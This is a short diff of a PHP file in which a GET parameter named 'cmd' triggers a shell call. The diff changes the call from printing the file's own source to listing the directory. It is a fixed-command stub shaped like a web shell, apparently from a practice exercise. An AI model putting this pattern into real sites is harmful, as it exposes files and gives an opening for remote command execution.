@@ -8,7 +8,7 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        system('cat index.php');
+        system('ls');
     }
 ?>
 </pre>
